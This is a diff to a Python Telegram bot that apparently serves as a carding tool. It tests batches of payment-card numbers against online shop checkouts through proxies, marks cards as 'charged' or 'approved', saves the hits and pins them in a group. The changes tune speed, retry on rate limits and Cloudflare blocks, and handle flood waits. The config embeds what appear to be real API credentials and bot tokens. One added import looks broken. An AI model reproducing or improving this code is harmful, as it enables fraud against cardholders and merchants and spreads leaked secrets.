@@ -1,6 +1,7 @@
 from telethon import TelegramClient, events, Button
 from telethon.errors import FloodWaitError
 from telethon.tl.types import KeyboardButtonCallback
+from pyrogram.errors import FloodWait, FloodWaitError
 from telethon import Button
 from flask import Flask
 import threading
@@ -24,7 +25,7 @@ from urllib.parse import quote
 # Config
 API_ID = 37250868
 API_HASH = "370eaf1a9ee59f21dd83ca8257efd6fd"
-BOT_TOKEN = "8337561320:AAEzKmjqA3bxMMSrcnuuHSs-qThUiivpEao" # Replace with your Bot Token
+BOT_TOKEN = "8337561320:AAHo3M6OaF2wMwxDpSh4e1K_c0kuWedBTU0" # Replace with your Bot Token
 ADMIN_ID = [7899583720, 8409853085,] # Replace with your Admin ID(s)
 GROUP_ID = -1003678203420 # Replace with your Group ID
 PREMIUM_FILE = "premium.json"
@@ -260,7 +261,7 @@ async def check_card_random_site(card, sites, user_id=None):
             if proxy_str:
                 url += f"&proxy={proxy_str}"
 
-            timeout = aiohttp.ClientTimeout(total=100)
+            timeout = aiohttp.ClientTimeout(total=30)
 
             async with aiohttp.ClientSession(timeout=timeout) as session:
                 async with session.get(url) as res:
@@ -383,7 +384,7 @@ async def check_card_specific_site(card, site, user_id=None):
         if proxy_str:
             url += f"&proxy={proxy_str}"
 
-        timeout = aiohttp.ClientTimeout(total=100)
+        timeout = aiohttp.ClientTimeout(total=30)
 
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as res:
@@ -1790,20 +1791,21 @@ async def mtxt(event):
         ACTIVE_MTXT_PROCESSES.pop(user_id, None)
         await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
 
+
 async def process_mtxt_cards(event, cards, local_sites):
     user_id = event.sender_id
     total = len(cards)
     checked = approved = charged = declined = 0
-    status_msg = await event.reply(f"```🔥 𝙈𝙏𝙓𝙏 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙨```")
+    status_msg = await event.reply(f"```🔥 𝙈𝙏𝙓𝙏 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎```")
 
     bin_cache = {}
-    semaphore = asyncio.Semaphore(10)
+    semaphore = asyncio.Semaphore(8)  # 3x speed
 
-    # Bad responses ke liye retry
     RETRY_TRIGGERS = [
         "merchandise_expected_price_mismatch", "validation_custom", "invalid json response",
         "delivery_delivery_line_detail_changed", "status: 401", "site error", "no working site found",
-        "products", "cloudflare", "bypass failed", "expecting value", "json", "401", "positive_amount_expected"
+        "products", "cloudflare", "bypass failed", "expecting value", "json", "401", "positive_amount_expected",
+        "rate limit", "too many requests", "429", "403", "timeout", "Site requires login", "Site requires login!", "Site not supported", "connection error"
     ]
 
     async def check_single_card(card):
@@ -1815,112 +1817,131 @@ async def process_mtxt_cards(event, cards, local_sites):
         max_attempts = 3
         sites_tried = set()
 
-        while attempts < max_attempts and local_sites:
+        while attempts < max_attempts:
             attempts += 1
             available_sites = [s for s in local_sites if s not in sites_tried]
             if not available_sites:
                 break
+
             current_site = random.choice(available_sites)
             sites_tried.add(current_site)
 
-            result = await check_card_specific_site(card, current_site, user_id)
+            async with semaphore:
+                try:
+                    result = await check_card_specific_site(card, current_site, user_id)
+                    
+                    checked += 1
+                    response_text = result.get("Response", "").lower()
 
-            checked += 1
-            response_text = result.get("Response", "")
-            response_lower = response_text.lower()
+                    should_retry = any(trigger in response_text for trigger in RETRY_TRIGGERS)
 
-            should_retry = any(trigger in response_lower for trigger in RETRY_TRIGGERS)
+                    if should_retry and attempts < max_attempts:
+                        checked -= 1
+                        await asyncio.sleep(3 + attempts * 2)  # faster backoff
+                        continue
 
-            if should_retry and attempts < max_attempts:
-                checked -= 1
-                continue
+                    # BIN info
+                    bin_num = card.split("|")[0]
+                    if bin_num not in bin_cache:
+                        bin_cache[bin_num] = await get_bin_info(bin_num)
+                    brand, bin_type, level, bank, country, flag = bin_cache[bin_num]
 
-            # BIN info
-            bin_num = card.split("|")[0]
-            if bin_num not in bin_cache:
-                bin_cache[bin_num] = await get_bin_info(bin_num)
-            brand, bin_type, level, bank, country, flag = bin_cache[bin_num]
+                    elapsed_time = round(random.uniform(3.0, 6.5), 2)
 
-            elapsed_time = round(random.uniform(2.5, 5.5), 2)
+                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
+                    is_hit = False
 
-            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
-            is_hit = False
+                    if any(x in response_text for x in ["charged", "order placed", "order completed", "payment successful", "💎", "insufficient_funds"]):
+                        charged += 1
+                        status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
+                        is_hit = True
+                        await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
+                    elif any(x in response_text for x in ["otp_required", "incorrect_cvc", "requires_action", "3d", "3ds", "approved", "success", "payment accepted"]):
+                        approved += 1
+                        status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
+                        is_hit = True
+                        await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
+                    else:
+                        declined += 1
 
-            if any(x in response_lower for x in ["charged", "order placed", "ORDER_PLACED", "order completed", "payment successful", "💎", "insufficient_funds"]):
-                charged += 1
-                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
-                is_hit = True
-                await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
-            elif any(x in response_lower for x in ["otp_required", "incorrect_cvc", "requires_action", "3d", "3ds", "approved", "success", "payment accepted"]):
-                approved += 1
-                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
-                is_hit = True
-                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
-            else:
-                declined += 1
-
-            # INSTANT HIT (approved + charged dono pakka dikhega)
-            if is_hit:
-                card_msg = f"""{status_header}
+                    if is_hit:
+                        card_msg = f"""{status_header}
 
 𝗖𝗖 ⇾ `{card}`
 𝗚𝗮𝘁𝙚𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Shopify')}
 𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}
 𝗣𝗿𝗶𝙘𝙚 ⇾ {result.get('Price')} 💸
-𝗦𝗶𝙩𝙚 ⇾ Random (Attempt {attempts}/3)
+𝗦𝗶𝙩𝙚 ⇾ {current_site} (Attempt {attempts}/3)
 
 ```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
-𝗕𝗮𝗻𝙠: {bank}
-𝗖𝗼𝙪𝙣𝙩𝙧𝙮: {country} {flag}```
+𝗕𝗮𝙣𝙠: {bank}
+𝗖𝙤𝙪𝙣𝙩𝙧𝙮: {country} {flag}```
 
 𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝙘𝙤𝙣𝙙𝙨
 """
-                result_msg = await event.reply(card_msg)
-                if "CHARGED" in status_header:
-                    await pin_charged_message(event, result_msg)
+                        result_msg = await event.reply(card_msg)
+                        if "CHARGED" in status_header:
+                            await pin_charged_message(event, result_msg)
 
-            price = result.get("Price", "N/A")
-            try:
-                price = f"${float(price):.2f}"
-            except:
-                pass
+                    # Status update
+                    price = result.get("Price", "N/A")
+                    try:
+                        price = f"${float(price):.2f}"
+                    except:
+                        pass
 
-            percent = min(round((checked / total) * 100, 1), 100)
-            blocks = 15
-            filled = int((checked / total) * blocks)
-            bar = "█" * filled + "░" * (blocks - filled)
+                    percent = min(round((checked / total) * 100, 1), 100)
+                    blocks = 15
+                    filled = int((checked / total) * blocks)
+                    bar = "█" * filled + "░" * (blocks - filled)
 
-            status_text = f"""💳 `{card[:12]}****`
+                    status_text = f"""💳 `{card[:12]}****`
 ╭────────────────────
 ├ ```📩 Resp ➜ {result.get('Response')}```
-├ 💲 {price} ➜ 
-├ 💎 Charged ➜  {charged}
+├ 💲 {price} 
+├ 💎 Charged ➜ {charged}
 ├ ✅ Approved ➜ {approved}
-├ ❌ Declined ➜  {declined}
+├ ❌ Declined ➜ {declined}
 ╰ 📊 {bar} {percent}% ({checked}/{total})
 """
-            buttons = [
-                [Button.inline(f"💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 • {charged}", b"none")],
-                [Button.inline(f"✅ 𝗔𝗣𝙋𝗥𝗢𝗩𝗘𝗗 • {approved}", b"none")],
-                [Button.inline("🛑 𝗦𝗧𝗢𝗣", f"stop_ranfor:{user_id}".encode())]
-            ]
-            try:
-                await status_msg.edit(status_text, buttons=buttons)
-            except:
-                pass
+                    buttons = [
+                        [Button.inline(f"💎 𝗖𝗛𝗔𝗥𝗚𝗘𝘿 • {charged}", b"none")],
+                        [Button.inline(f"✅ 𝗔𝗣𝙋𝗥𝗢𝙑𝙀𝘿 • {approved}", b"none")],
+                        [Button.inline("🛑 𝗦𝗧𝗢𝗣", f"stop_mtxt:{user_id}".encode())]
+                    ]
 
-            break  # Final for this card
+                    if checked % 4 == 0 or checked == total:                
+                        try:
+                            await status_msg.edit(status_text, buttons=buttons)
+                        except:
+                            pass
+
+                    break
+
+                except (FloodWait, FloodWaitError) as e:
+                    wait = (getattr(e, 'value', getattr(e, 'seconds', 30))) + random.randint(3, 8)
+                    print(f"[MTXT] Flood wait {wait}s")
+                    await asyncio.sleep(wait)
+                    checked -= 1
+                    continue
+                except Exception as e:
+                    print(f"[MTXT] Card error {card[:6]}...: {e}")
+                    if attempts < max_attempts:
+                        await asyncio.sleep(3)
+                        continue
+                    checked += 1
+                    declined += 1
+                    break
 
     try:
         tasks = [check_single_card(card) for card in cards]
         await asyncio.gather(*tasks, return_exceptions=True)
         ACTIVE_MTXT_PROCESSES.pop(user_id, None)
 
-        # Final summary
         await event.reply(f"**✅ MTXT CHECK FINISHED**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")
 
     except Exception as e:
-        print(f"[MTXT] Error: {e}")
+        print(f"[MTXT] Major Error: {e}")
 
 
 @client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
